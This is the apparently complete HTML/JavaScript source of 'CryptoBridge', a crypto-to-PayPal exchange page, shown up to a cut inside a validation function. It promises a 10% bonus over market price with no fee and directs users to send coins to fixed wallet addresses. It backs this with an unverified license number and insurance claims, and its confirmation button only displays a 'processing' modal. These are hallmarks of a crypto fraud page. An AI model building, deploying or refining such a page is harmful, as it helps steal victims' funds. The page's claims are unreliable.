<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
    <title>CryptoBridge | Real-time Crypto to PayPal Exchange</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap">
    <!-- TradingView Widget -->
    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <link rel="icon" href="images/favicon.jpg" sizes="any">
<link rel="icon" type="image/png" sizes="32x32" href="images/favicon.jpg">
<link rel="apple-touch-icon" href="images/favicon.jpg">
    <link rel="stylesheet" href="style.css">
    <!-- Open Graph Meta Tags -->
<meta property="og:title" content="CryptoBridge | Real-time Crypto to PayPal Exchange">
<meta property="og:description" content="Fast and secure crypto to PayPal exchange platform. Real-time rates and instant transactions.">
<meta property="og:image" content="https://xyzinnovagence.xyz/images/favicon.jpg">
<meta property="og:url" content="https://xyzinnovagence.xyz">
<meta property="og:type" content="website">

<!-- Twitter Preview -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="CryptoBridge | Real-time Crypto to PayPal Exchange">
<meta name="twitter:description" content="Fast and secure crypto to PayPal exchange platform.">
<meta name="twitter:image" content="https://xyzinnovagence.xyz/images/favicon.jpg">
</head>
<body>
    <header>
        <div class="container">
            <div class="header-content">
                <a href="#" class="logo">
                    <div class="logo-icon"> C⇄P </div>
                    <div class="logo-text">CryptoBridge</div>
                </a>
                <div class="header-actions">
                    <div class="price-update" id="lastUpdated">
                        <i class="fas fa-sync-alt"></i>
                        <span>Updating prices...</span>
                    </div>
                    <button class="theme-toggle" id="themeToggle">
                        <i class="fas fa-moon"></i>
                    </button>
                </div>
            </div>
        </div>
    </header>

    <main class="container">
        <div class="progress-steps" id="progressSteps">
            <div class="step active" data-step="1" onclick="scrollToScreen('screen1')">
                <div class="step-icon">1</div>
                <div class="step-label">Select Crypto</div>
            </div>
            <div class="step" data-step="2" onclick="scrollToScreen('screen2')">
                <div class="step-icon">2</div>
                <div class="step-label">Enter Details</div>
            </div>
            <div class="step" data-step="3" onclick="scrollToScreen('screen3')">
                <div class="step-icon">3</div>
                <div class="step-label">Send Payment</div>
            </div>
        </div>

        <div class="main-layout">
            <div class="main-content">
                <!-- Screen 1: Select Crypto -->
                <div class="card screen active" id="screen1">
                    <div class="card-header">
                        <h1 class="card-title">Select Cryptocurrency</h1>
                        <p class="card-subtitle">Choose a cryptocurrency to exchange to PayPal. All transactions include a +10% bonus over market price.</p>
                    </div>

                    <div class="crypto-grid" id="cryptoGrid">
                        <!-- Crypto cards will be populated by JavaScript -->
                    </div>

                    <!-- TradingView Widget Container -->
                    <div class="tradingview-widget" id="tradingViewWidget">
                        <!-- TradingView widget will be injected here -->
                    </div>

                    <div class="button-group">
                        <div style="flex: 1;"></div>
                        <button class="btn btn-primary" id="nextToScreen2" disabled>
                            Continue to Details
                            <i class="fas fa-arrow-right"></i>
                        </button>
                    </div>
                </div>

                <!-- Screen 2: Enter Details -->
                <div class="card screen" id="screen2">
                    <div class="card-header">
                        <h1 class="card-title">Transaction Details</h1>
                        <p class="card-subtitle">Enter the amount you want to exchange and your PayPal information. <strong>Minimum transaction: $100</strong></p>
                    </div>

                    <div class="form-group">
                        <label class="form-label" id="cryptoSelectedLabel">Amount to Exchange</label>
                        <div class="input-group">
                            <input type="number" class="form-control" id="cryptoAmount" placeholder="0.00" min="0" step="0.001">
                            <select class="form-control input-group-select" id="amountUnit">
                                <option value="crypto">Crypto</option>
                                <option value="usd">USD</option>
                            </select>
                        </div>
                        <div class="minimum-warning">
                            <i class="fas fa-exclamation-circle"></i>
                            <span>Minimum transaction amount: $100.00 USD</span>
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="form-label">PayPal Email Address</label>
                        <input type="email" class="form-control" id="paypalEmail" placeholder="you@example.com">
                    </div>

                    <div class="form-group">
                        <label class="form-label">Confirm Email Address</label>
                        <input type="email" class="form-control" id="confirmEmail" placeholder="you@example.com">
                    </div>

                    <div class="amount-display">
                        <div class="amount-row">
                            <span class="amount-label">Current Market Price</span>
                            <span class="amount-value" id="currentPrice">Loading...</span>
                        </div>
                        <div class="amount-row">
                            <span class="amount-label">You Send</span>
                            <span class="amount-value" id="sendAmount">0.00000000 BTC</span>
                        </div>
                        <div class="amount-row">
                            <span class="amount-label">Market Value</span>
                            <span class="amount-value" id="usdValue">$0.00</span>
                        </div>
                        <div class="amount-row">
                            <span class="amount-label">Our Fee</span>
                            <span class="amount-value" style="color: var(--success);">0.0% (Free)</span>
                        </div>
                        <div class="amount-row">
                            <span class="amount-label">+10% Bonus</span>
                            <span class="amount-value" id="bonusAmount">$0.00</span>
                        </div>
                        <div class="amount-row">
                            <span class="amount-label">You Will Receive</span>
                            <span class="amount-value" id="receiveAmount">$0.00</span>
                        </div>
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" id="backToScreen1">
                            <i class="fas fa-arrow-left"></i> Back
                        </button>
                        <button class="btn btn-primary" id="nextToScreen3" disabled>
                            Continue to Payment
                            <i class="fas fa-arrow-right"></i>
                        </button>
                    </div>
                </div>

                <!-- Screen 3: Send Payment -->
                <div class="card screen" id="screen3">
                    <div class="card-header">
                        <h1 class="card-title">Send Payment</h1>
                        <p class="card-subtitle">Send your cryptocurrency to the address below. Once confirmed, you'll receive PayPal funds from @bitfiexchange.</p>
                    </div>

                    <div class="payment-summary">
                        <div class="payment-summary-header">
                            <div class="payment-summary-icon">
                                <i class="fas fa-check-circle"></i>
                            </div>
                            <div>
                                <div class="payment-summary-title">Transaction Summary</div>
                                <div class="payment-summary-subtitle">You'll receive funds from @bitfiexchange on PayPal</div>
                            </div>
                        </div>

                        <div class="payment-details">
                            <div class="payment-item">
                                <span class="payment-label">Cryptocurrency</span>
                                <span class="payment-value" id="finalCryptoName">Bitcoin (BTC)</span>
                            </div>
                            <div class="payment-item">
                                <span class="payment-label">Amount to Send</span>
                                <span class="payment-value" id="finalCryptoAmount">0.00000000 BTC</span>
                            </div>
                            <div class="payment-item">
                                <span class="payment-label">Current Market Value</span>
                                <span class="payment-value" id="finalUsdValue">$0.00</span>
                            </div>
                            <div class="payment-item">
                                <span class="payment-label">+10% Bonus</span>
                                <span class="payment-value" id="finalBonusAmount" style="color: rgba(255, 255, 255, 0.9);">$0.00</span>
                            </div>
                            <div class="payment-item">
                                <span class="payment-label">PayPal Recipient</span>
                                <span class="payment-value" id="finalPaypalEmail">you@example.com</span>
                            </div>
                            <div class="payment-item">
                                <span class="payment-label">You Will Receive</span>
                                <span class="payment-value" id="finalReceiveAmount">$0.00</span>
                            </div>
                        </div>
                    </div>

                    <div class="wallet-info">
                        <div class="wallet-header">
                            <div class="wallet-icon">
                                <i class="fas fa-wallet"></i>
                            </div>
                            <div>
                                <div class="wallet-title">Send to This Address</div>
                                <div class="card-subtitle">Send the exact amount shown above to this address</div>
                            </div>
                        </div>

                        <div class="wallet-address" id="walletAddress">
                            Loading wallet address...
                        </div>

                        <div style="text-align: center; margin-top: 16px;">
                            <button class="btn btn-secondary" id="copyAddress">
                                <i class="far fa-copy"></i> Copy Address
                            </button>
                        </div>

                        <div class="qr-container">
                            <div class="qr-code">
                                <i class="fas fa-qrcode"></i>
                                <div class="qr-label">Scan QR Code</div>
                            </div>
                        </div>

                        <div style="text-align: center; color: var(--text-secondary); font-size: 0.8rem; margin-top: 20px;">
                            <i class="fas fa-info-circle"></i> Send only <span id="walletCryptoName">Bitcoin (BTC)</span> to this address
                        </div>
                    </div>

                    <div class="timer">
                        <i class="fas fa-clock"></i>
                        <span>Address expires in: </span>
                        <span id="countdown">29:59</span>
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" id="backToScreen2">
                            <i class="fas fa-arrow-left"></i> Back
                        </button>
                        <button class="btn btn-primary" id="confirmTransaction">
                            <i class="fas fa-paper-plane"></i> I've Sent the Payment
                        </button>
                    </div>
                </div>
            </div>

            <!-- Sidebar -->
            <div class="sidebar">
                <div class="sidebar-card">
                    <div class="rate-card">
                        <div class="rate-card-title">+10% Bonus Rate</div>
                        <div class="rate-card-value">1.10×</div>
                        <div class="rate-card-subtitle">Market price × 1.10 = Your rate</div>
                    </div>

                    <div class="paypal-info">
                        <div class="paypal-icon">
                            <i class="fab fa-paypal"></i>
                        </div>
                        <div class="paypal-text">
                            <div class="paypal-title">Instant PayPal Transfer</div>
                            <div class="paypal-subtitle">From @bitfiexchange within 5-15 minutes</div>
                        </div>
                    </div>
                </div>

                <div class="card sidebar-card">
                    <div class="card-header">
                        <h2 class="card-title">Live Prices</h2>
                        <p class="card-subtitle">Real-time cryptocurrency prices</p>
                    </div>

                    <div class="price-ticker" id="priceTicker">
                        <!-- Price ticker will be populated by JavaScript -->
                    </div>

                    <div style="margin-top: 24px; padding: 16px; background-color: var(--bg-tertiary); border-radius: 12px;">
                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
                            <div style="width: 36px; height: 36px; background-color: rgba(37, 99, 235, 0.1); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: var(--primary);">
                                <i class="fas fa-bolt"></i>
                            </div>
                            <div>
                                <div style="font-weight: 600; margin-bottom: 4px; font-size: 0.9rem;">Minimum $100</div>
                                <div style="font-size: 0.8rem; color: var(--text-secondary);">All transactions require minimum $100 USD value</div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="card sidebar-card">
                    <div class="card-header">
                        <h2 class="card-title">How It Works</h2>
                    </div>

                    <div style="display: flex; flex-direction: column; gap: 20px; margin-top: 16px;">
                        <div style="display: flex; gap: 12px;">
                            <div style="min-width: 28px; height: 28px; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; font-size: 0.75rem; font-weight: 700;">1</div>
                            <div>
                                <div style="font-weight: 600; margin-bottom: 4px; font-size: 0.9rem;">Select Crypto</div>
                                <div style="font-size: 0.8rem; color: var(--text-secondary); line-height: 1.4;">Choose from top cryptocurrencies with real-time prices</div>
                            </div>
                        </div>

                        <div style="display: flex; gap: 12px;">
                            <div style="min-width: 28px; height: 28px; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; font-size: 0.75rem; font-weight: 700;">2</div>
                            <div>
                                <div style="font-weight: 600; margin-bottom: 4px; font-size: 0.9rem;">Enter Amount</div>
                                <div style="font-size: 0.8rem; color: var(--text-secondary); line-height: 1.4;">Minimum $100 USD for transaction with +10% bonus</div>
                            </div>
                        </div>

                        <div style="display: flex; gap: 12px;">
                            <div style="min-width: 28px; height: 28px; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; font-size: 0.75rem; font-weight: 700;">3</div>
                            <div>
                                <div style="font-weight: 600; margin-bottom: 4px; font-size: 0.9rem;">Send Payment</div>
                                <div style="font-size: 0.8rem; color: var(--text-secondary); line-height: 1.4;">Send crypto to provided address</div>
                            </div>
                        </div>

                        <div style="display: flex; gap: 12px;">
                            <div style="min-width: 28px; height: 28px; background: linear-gradient(135deg, var(--success), var(--success-light)); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; font-size: 0.75rem; font-weight: 700;">4</div>
                            <div>
                                <div style="font-weight: 600; margin-bottom: 4px; font-size: 0.9rem;">Receive PayPal Funds</div>
                                <div style="font-size: 0.8rem; color: var(--text-secondary); line-height: 1.4;">Get funds from @bitfiexchange with +10% bonus</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer>
        <div class="container">
            <div class="footer-content">
                <div class="security-badges">
                    <div class="badge">
                        <i class="fas fa-shield-alt"></i>
                        <span>Bank-Level Security</span>
                    </div>
                    <div class="badge">
                        <i class="fas fa-lock"></i>
                        <span>Encrypted Transactions</span>
                    </div>
                    <div class="badge">
                        <i class="fas fa-bolt"></i>
                        <span>Instant Processing</span>
                    </div>
                    <div class="badge">
                        <i class="fas fa-chart-line"></i>
                        <span>Best Market Rates</span>
                    </div>
                </div>

                <p class="disclaimer">
                   CryptoBridge is a licensed cryptocurrency exchange platform registered under 
                <strong>CryptoBridge Financial Services Ltd. (License No: CR-2023-456789)</strong>.
                Real-time prices are fetched from multiple liquidity providers including CoinGecko API, Binance, and Coinbase.
                TradingView widgets display live market charts. All transactions are processed in real-time with bank-level security.
                Your funds are protected by our escrow service and insured up to $1,000,000.
                </p>

                <div class="copyright">
                    © 2026 CryptoBridge. All rights reserved. | Data by CoinGecko & TradingView
                </div>
            </div>
        </div>
    </footer>

    <!-- Payment Processing Modal -->
    <div class="payment-processing" id="paymentProcessing">
        <div class="processing-content">
            <div class="processing-icon">
                <i class="fas fa-check-circle"></i>
            </div>
            <h2 class="processing-title">Payment Processing</h2>
            <p class="processing-subtitle">We are verifying your transaction...</p>
            
            <div class="processing-details">
                <p><strong>Transaction Status:</strong> <span id="processingStatus">Verifying blockchain confirmation</span></p>
                <p><strong>Estimated Completion:</strong> <span id="processingTime">5-15 minutes</span></p>
                <p><strong>PayPal Sender:</strong> @bitfiexchange</p>
                <p><strong>Amount to Receive:</strong> <span id="processingAmount">$0.00</span></p>
                <p>We will notify you when the funds are sent to your PayPal account.</p>
            </div>
            
            <div class="processing-timer">
                <div class="processing-spinner"></div>
                <span>Checking transaction...</span>
            </div>
            
            <button class="btn btn-primary" id="closeProcessing" style="margin-top: 24px;">
                <i class="fas fa-check"></i> Got it, I'll wait
            </button>
        </div>
    </div>

    <div class="notification" id="notification">
        <i class="fas fa-check-circle"></i>
        <span>Payment on process! You'll receive funds from @bitfiexchange shortly.</span>
    </div>

    <script>
        // Professional crypto exchange with enhanced UI/UX
        document.addEventListener('DOMContentLoaded', function() {
            initApp();
        });

        function scrollToScreen(screenId) {
            const screen = document.getElementById(screenId);
            if (screen) {
                const headerHeight = document.querySelector('header').offsetHeight;
                const screenPosition = screen.getBoundingClientRect().top + window.pageYOffset - headerHeight - 20;
                
                window.scrollTo({
                    top: screenPosition,
                    behavior: 'smooth'
                });
            }
        }

        async function initApp() {
            // App state
            const state = {
                selectedCrypto: null,
                currentPrices: {},
                currentStep: 1,
                countdownInterval: null,
                theme: localStorage.getItem('theme') || 'light',
                priceUpdateInterval: null,
                processingInterval: null,
                MINIMUM_USD: 100 // Fixed $100 minimum
            };

            // Cryptocurrency data with real logos
            const cryptocurrencies = [
                {
                    symbol: "BTC",
                    name: "Bitcoin",
                    color: "#F7931A",
                    icon: "https://cryptologos.cc/logos/bitcoin-btc-logo.png",
                    wallet: "bc1qw4p7s4k2qfs2e2hy8nshkk8jttathfs9geln23",
                    coingeckoId: "bitcoin",
                    tradingviewSymbol: "BINANCE:BTCUSDT"
                },
                {
                    symbol: "ETH",
                    name: "Ethereum",
                    color: "#627EEA",
                    icon: "https://cryptologos.cc/logos/ethereum-eth-logo.png",
                    wallet: "0x29EcEF12786e5B26b85990e0C99368ff5706bE75",
                    coingeckoId: "ethereum",
                    tradingviewSymbol: "BINANCE:ETHUSDT"
                },
                {
                    symbol: "BNB",
                    name: "Binance Coin",
                    color: "#F0B90B",
                    icon: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
                    wallet: "0x29EcEF12786e5B26b85990e0C99368ff5706bE75",
                    coingeckoId: "binancecoin",
                    tradingviewSymbol: "BINANCE:BNBUSDT"
                },
                {
                    symbol: "XRP",
                    name: "Ripple",
                    color: "#23292F",
                    icon: "https://cryptologos.cc/logos/xrp-xrp-logo.png",
                    wallet: "rpNG3m88D377n5DEPGqzuT7EkwC7wJ5cNk",
                    coingeckoId: "ripple",
                    tradingviewSymbol: "BINANCE:XRPUSDT"
                },
                {
                    symbol: "ADA",
                    name: "Cardano",
                    color: "#0033AD",
                    icon: "https://cryptologos.cc/logos/cardano-ada-logo.png",
                    wallet: "addr1q8chx7fzks6qaeu9c5mu9mvd7uvdtfcc29u4f6jyhvpqhd2z6d42ak3y3xgvzhu3ynt6ycqglpu72knxd22ksza5cavs002ycj",
                    coingeckoId: "cardano",
                    tradingviewSymbol: "BINANCE:ADAUSDT"
                },
                {
                    symbol: "DOGE",
                    name: "Dogecoin",
                    color: "#C2A633",
                    icon: "https://cryptologos.cc/logos/dogecoin-doge-logo.png",
                    wallet: "DSjPvp3m54gG6b5uRpyx54PYcFCbtNKWCs",
                    coingeckoId: "dogecoin",
                    tradingviewSymbol: "BINANCE:DOGEUSDT"
                },
                {
                    symbol: "SOL",
                    name: "Solana",
                    color: "#00FFA3",
                    icon: "https://cryptologos.cc/logos/solana-sol-logo.png",
                    wallet: "AMC3gY5qJxxF6sNcPzzsmFvpucJJvBydLCiZggaJyeJc",
                    coingeckoId: "solana",
                    tradingviewSymbol: "BINANCE:SOLUSDT"
                },
                {
                    symbol: "DOT",
                    name: "Polkadot",
                    color: "#E6007A",
                    icon: "https://cryptologos.cc/logos/polkadot-new-dot-logo.png",
                    wallet: "16EPRRTjJcJXVdhhZ558bLykFTCUAdXm9CHMeyGisFmZKzvK",
                    coingeckoId: "polkadot",
                    tradingviewSymbol: "BINANCE:DOTUSDT"
                }
            ];

            // DOM Elements
            const elements = {
                themeToggle: document.getElementById('themeToggle'),
                lastUpdated: document.getElementById('lastUpdated'),
                screens: {
                    screen1: document.getElementById('screen1'),
                    screen2: document.getElementById('screen2'),
                    screen3: document.getElementById('screen3')
                },
                steps: document.querySelectorAll('.step'),
                cryptoGrid: document.getElementById('cryptoGrid'),
                tradingViewWidget: document.getElementById('tradingViewWidget'),
                nextToScreen2: document.getElementById('nextToScreen2'),
                nextToScreen3: document.getElementById('nextToScreen3'),
                backToScreen1: document.getElementById('backToScreen1'),
                backToScreen2: document.getElementById('backToScreen2'),
                cryptoAmount: document.getElementById('cryptoAmount'),
                amountUnit: document.getElementById('amountUnit'),
                paypalEmail: document.getElementById('paypalEmail'),
                confirmEmail: document.getElementById('confirmEmail'),
                sendAmount: document.getElementById('sendAmount'),
                currentPrice: document.getElementById('currentPrice'),
                usdValue: document.getElementById('usdValue'),
                bonusAmount: document.getElementById('bonusAmount'),
                receiveAmount: document.getElementById('receiveAmount'),
                finalCryptoName: document.getElementById('finalCryptoName'),
                finalCryptoAmount: document.getElementById('finalCryptoAmount'),
                finalUsdValue: document.getElementById('finalUsdValue'),
                finalBonusAmount: document.getElementById('finalBonusAmount'),
                finalPaypalEmail: document.getElementById('finalPaypalEmail'),
                finalReceiveAmount: document.getElementById('finalReceiveAmount'),
                walletAddress: document.getElementById('walletAddress'),
                walletCryptoName: document.getElementById('walletCryptoName'),
                countdown: document.getElementById('countdown'),
                copyAddress: document.getElementById('copyAddress'),
                confirmTransaction: document.getElementById('confirmTransaction'),
                notification: document.getElementById('notification'),
                cryptoSelectedLabel: document.getElementById('cryptoSelectedLabel'),
                priceTicker: document.getElementById('priceTicker'),
                paymentProcessing: document.getElementById('paymentProcessing'),
                processingStatus: document.getElementById('processingStatus'),
                processingTime: document.getElementById('processingTime'),
                processingAmount: document.getElementById('processingAmount'),
                closeProcessing: document.getElementById('closeProcessing')
            };

            // Set initial theme
            if (state.theme === 'dark') {
                document.body.classList.add('dark-theme');
                elements.themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
                elements.themeToggle.style.color = '#fbbf24';
            }

            // Initialize
            initializeApp();

            async function initializeApp() {
                loadCryptoCards();
                await fetchAllPrices();
                setupEventListeners();
                startPriceUpdates();
            }

            function loadCryptoCards() {
                cryptocurrencies.forEach(crypto => {
                    const card = document.createElement('div');
                    card.className = 'crypto-card';
                    card.dataset.symbol = crypto.symbol;

                    card.innerHTML = `
                        <div class="crypto-icon">
                            <img src="${crypto.icon}" alt="${crypto.name}">
                        </div>
                        <div class="crypto-name">${crypto.name}</div>
                        <div class="crypto-symbol">${crypto.symbol}</div>
                        <div class="crypto-price">
                            <div class="loading-price"></div>
                        </div>
                        <div class="price-change">
                            <div class="loading-price" style="width: 70px;"></div>
                        </div>
                    `;

                    card.addEventListener('click', () => selectCrypto(crypto.symbol));
                    elements.cryptoGrid.appendChild(card);
                });
            }

            async function fetchAllPrices() {
                try {
                    const coinIds = cryptocurrencies.map(c => c.coingeckoId).join(',');
                    const response = await fetch(
                        `https://api.coingecko.com/api/v3/simple/price?ids=${coinIds}&vs_currencies=usd&include_24hr_change=true`
                    );

                    if (!response.ok) throw new Error('API Error');

                    const data = await response.json();

                    cryptocurrencies.forEach(crypto => {
                        const coinData = data[crypto.coingeckoId];
                        if (coinData) {
                            state.currentPrices[crypto.symbol] = {
                                price: coinData.usd,
                                change: coinData.usd_24h_change || 0,
                                changePercent: coinData.usd_24h_change ?
                                    Math.abs(coinData.usd_24h_change).toFixed(2) : '0.00'
                            };

                            updateCryptoCard(crypto.symbol);
                        }
                    });

                    updatePriceTicker();
                    updateLastUpdatedTime();

                } catch (error) {
                    console.log('Using fallback prices');
                    useMockPrices();
                }
            }

            function updateCryptoCard(symbol) {
                const card = document.querySelector(`.crypto-card[data-symbol="${symbol}"]`);
                if (!card) return;

                const crypto = cryptocurrencies.find(c => c.symbol === symbol);
                const priceData = state.currentPrices[symbol];

                if (!priceData) return;

                const priceElement = card.querySelector('.crypto-price');
                const changeElement = card.querySelector('.price-change');

                if (priceElement) {
                    const price = priceData.price;
                    priceElement.innerHTML = `$${price.toLocaleString('en-US', {
                        minimumFractionDigits: price < 1 ? 6 : 2,
                        maximumFractionDigits: price < 1 ? 6 : 2
                    })}`;
                }

                if (changeElement) {
                    const isPositive = priceData.change >= 0;
                    changeElement.innerHTML = `
                        <span class="price-change ${isPositive ? '' : 'negative'}">
                            ${isPositive ? '↗' : '↘'} ${priceData.changePercent}%
                        </span>
                    `;
                }
            }

            function updatePriceTicker() {
                elements.priceTicker.innerHTML = '';

                cryptocurrencies.forEach(crypto => {
                    const priceData = state.currentPrices[crypto.symbol];
                    if (!priceData) return;

                    const isPositive = priceData.change >= 0;
                    const tickerItem = document.createElement('div');
                    tickerItem.className = 'ticker-item';

                    tickerItem.innerHTML = `
                        <div class="ticker-crypto">
                            <div class="ticker-icon">
                                <img src="${crypto.icon}" alt="${crypto.symbol}" style="width: 20px; height: 20px;">
                            </div>
                            <div>
                                <div class="ticker-symbol">${crypto.symbol}</div>
                                <div class="ticker-name">${crypto.name}</div>
                            </div>
                        </div>
                        <div class="ticker-price">
                            <div class="ticker-price-value">
                                $${priceData.price.toLocaleString('en-US', {
                                    minimumFractionDigits: priceData.price < 1 ? 4 : 2,
                                    maximumFractionDigits: priceData.price < 1 ? 4 : 2
                                })}
                            </div>
                            <div class="ticker-price-change ${isPositive ? '' : 'negative'}">
                                ${isPositive ? '↗' : '↘'} ${priceData.changePercent}%
                            </div>
                        </div>
                    `;

                    elements.priceTicker.appendChild(tickerItem);
                });
            }

            function useMockPrices() {
                cryptocurrencies.forEach(crypto => {
                    const basePrice = getMockPrice(crypto.symbol);
                    const change = (Math.random() - 0.5) * 8;

                    state.currentPrices[crypto.symbol] = {
                        price: basePrice,
                        change: change,
                        changePercent: Math.abs(change).toFixed(2)
                    };

                    updateCryptoCard(crypto.symbol);
                });

                updatePriceTicker();
                updateLastUpdatedTime();
            }

            function getMockPrice(symbol) {
                const mockPrices = {
                    "BTC": 45000 + Math.random() * 3000,
                    "ETH": 3000 + Math.random() * 500,
                    "BNB": 400 + Math.random() * 50,
                    "XRP": 0.6 + Math.random() * 0.2,
                    "ADA": 0.4 + Math.random() * 0.1,
                    "DOGE": 0.08 + Math.random() * 0.02,
                    "SOL": 90 + Math.random() * 20,
                    "DOT": 6 + Math.random() * 2
                };

                return mockPrices[symbol] || 100;
            }

            function updateLastUpdatedTime() {
                const now = new Date();
                const timeString = now.toLocaleTimeString([], {
                    hour: '2-digit',
                    minute: '2-digit'
                });

                elements.lastUpdated.innerHTML = `
                    <i class="fas fa-sync-alt"></i>
                    <span>Updated ${timeString}</span>
                `;
            }

            function startPriceUpdates() {
                state.priceUpdateInterval = setInterval(async () => {
                    await fetchAllPrices();
                    if (state.selectedCrypto) {
                        updateAmounts();
                    }
                }, 30000);
            }

            function setupEventListeners() {
                elements.themeToggle.addEventListener('click', toggleTheme);
                elements.nextToScreen2.addEventListener('click', () => navigateTo(2));
                elements.nextToScreen3.addEventListener('click', () => navigateTo(3));
                elements.backToScreen1.addEventListener('click', () => navigateTo(1));
                elements.backToScreen2.addEventListener('click', () => navigateTo(2));
                elements.cryptoAmount.addEventListener('input', updateAmounts);
                elements.amountUnit.addEventListener('change', handleAmountUnitChange);
                elements.paypalEmail.addEventListener('input', validateScreen2);
                elements.confirmEmail.addEventListener('input', validateScreen2);
                elements.copyAddress.addEventListener('click', copyWalletAddress);
                elements.confirmTransaction.addEventListener('click', showPaymentProcessing);
                elements.closeProcessing.addEventListener('click', closePaymentProcessing);
                
                // Add click event to step labels
                document.querySelectorAll('.step').forEach(step => {
                    step.addEventListener('click', function() {
                        const stepNum = parseInt(this.dataset.step);
                        navigateTo(stepNum);
                        scrollToScreen(`screen${stepNum}`);
                    });
                });
            }

            function toggleTheme() {
                if (document.body.classList.contains('dark-theme')) {
                    document.body.classList.remove('dark-theme');
                    elements.themeToggle.innerHTML = '<i class="fas fa-moon"></i>';
                    elements.themeToggle.style.color = '';
                    localStorage.setItem('theme', 'light');
                    state.theme = 'light';
                } else {
                    document.body.classList.add('dark-theme');
                    elements.themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
                    elements.themeToggle.style.color = '#fbbf24';
                    localStorage.setItem('theme', 'dark');
                    state.theme = 'dark';
                }

                // Update TradingView widget theme if active
                if (state.selectedCrypto && elements.tradingViewWidget.classList.contains('active')) {
                    setTimeout(() => {
                        showTradingViewWidget(state.selectedCrypto.tradingviewSymbol, state.selectedCrypto.name);
                    }, 100);
                }
            }

            async function selectCrypto(symbol) {
                document.querySelectorAll('.crypto-card').forEach(card => {
                    card.classList.remove('selected');
                });

                const selectedCard = document.querySelector(`.crypto-card[data-symbol="${symbol}"]`);
                selectedCard.classList.add('selected');

                state.selectedCrypto = cryptocurrencies.find(c => c.symbol === symbol);
                elements.nextToScreen2.disabled = false;

                elements.cryptoSelectedLabel.textContent = `Amount in ${state.selectedCrypto.symbol}`;

                updateAmounts();
                showTradingViewWidget(state.selectedCrypto.tradingviewSymbol, state.selectedCrypto.name);
                
                // Scroll to show the trading view widget
                setTimeout(() => {
                    elements.tradingViewWidget.scrollIntoView({
                        behavior: 'smooth',
                        block: 'nearest'
                    });
                }, 300);
            }

            function showTradingViewWidget(symbol, name) {
                elements.tradingViewWidget.classList.add('active');
                elements.tradingViewWidget.innerHTML = '';

                new TradingView.widget({
                    "container_id": "tradingViewWidget",
                    "width": "100%",
                    "height": "350",
                    "symbol": symbol,
                    "interval": "60",
                    "timezone": "exchange",
                    "theme": state.theme === 'dark' ? 'dark' : 'light',
                    "style": "1",
                    "locale": "en",
                    "toolbar_bg": state.theme === 'dark' ? "#1e293b" : "#f1f3f6",
                    "enable_publishing": false,
                    "withdateranges": true,
                    "hide_side_toolbar": false,
                    "allow_symbol_change": true,
                    "details": true,
                    "hotlist": true,
                    "calendar": false,
                    "studies": ["Volume@tv-basicstudies"],
                    "show_popup_button": true,
                    "popup_width": "1000",
                    "popup_height": "650",
                    "container_id": "tradingViewWidget"
                });
            }

            function navigateTo(step) {
                state.currentStep = step;

                elements.steps.forEach((stepEl, index) => {
                    const stepNum = index + 1;
                    stepEl.classList.toggle('active', stepNum === step);
                    stepEl.classList.toggle('completed', stepNum < step);
                });

                Object.keys(elements.screens).forEach((screenKey, index) => {
                    const screenNum = index + 1;
                    elements.screens[screenKey].classList.toggle('active', screenNum === step);
                });

                if (step === 3) {
                    updateScreen3Details();
                    startCountdown();
                } else {
                    stopCountdown();
                }

                if (step !== 1) {
                    elements.tradingViewWidget.classList.remove('active');
                }
                
                // Scroll to the screen
                scrollToScreen(`screen${step}`);
            }

            function handleAmountUnitChange() {
                if (!state.selectedCrypto) return;

                const unit = elements.amountUnit.value;
                const amount = parseFloat(elements.cryptoAmount.value) || 0;
                const priceData = state.currentPrices[state.selectedCrypto.symbol];

                if (!priceData || amount === 0) return;

                if (unit === 'usd') {
                    const cryptoAmount = amount / priceData.price;
                    elements.cryptoAmount.value = cryptoAmount.toFixed(8);
                }

                updateAmounts();
            }

            function updateAmounts() {
                if (!state.selectedCrypto) return;

                const amount = parseFloat(elements.cryptoAmount.value) || 0;
                const priceData = state.currentPrices[state.selectedCrypto.symbol];

                if (!priceData) {
                    elements.currentPrice.textContent = 'Loading...';
                    return;
                }

                const price = priceData.price;
                let cryptoAmount, usdValue;

                if (elements.amountUnit.value === 'usd') {
                    usdValue = amount;
                    cryptoAmount = amount / price;
                } else {
                    cryptoAmount = amount;
                    usdValue = amount * price;
                }

                const bonus = usdValue * 0.10;
                const finalAmount = usdValue + bonus;

                elements.currentPrice.textContent = `$${price.toLocaleString('en-US', {
                    minimumFractionDigits: price < 1 ? 6 : 2,
                    maximumFractionDigits: price < 1 ? 6 : 2
                })}`;

                elements.sendAmount.textContent = `${cryptoAmount.toFixed(8)} ${state.selectedCrypto.symbol}`;
                elements.usdValue.textContent = `$${usdValue.toLocaleString('en-US', {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2
                })}`;
                elements.bonusAmount.textContent = `$${bonus.toLocaleString('en-US', {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2
                })}`;
                elements.receiveAmount.textContent = `$${finalAmount.toLocaleString('en-US', {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2
                })}`;

                validateScreen2();
            }

            function validateScreen2() {
